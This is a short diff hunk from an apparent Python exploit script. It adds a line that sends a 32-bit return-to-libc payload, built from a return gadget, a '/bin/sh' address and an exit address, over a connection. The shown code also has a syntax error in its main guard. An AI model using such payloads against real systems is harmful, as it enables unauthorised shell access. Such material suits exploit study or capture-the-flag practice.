@@ -26,6 +26,7 @@ def attack(conn):
     attack+=p32(pret)
     attack+=p32(binsh_addr)
     attack+=p32(exit_addr)
+    conn.sendline(attack)
 
 
 if __name__='__main__':
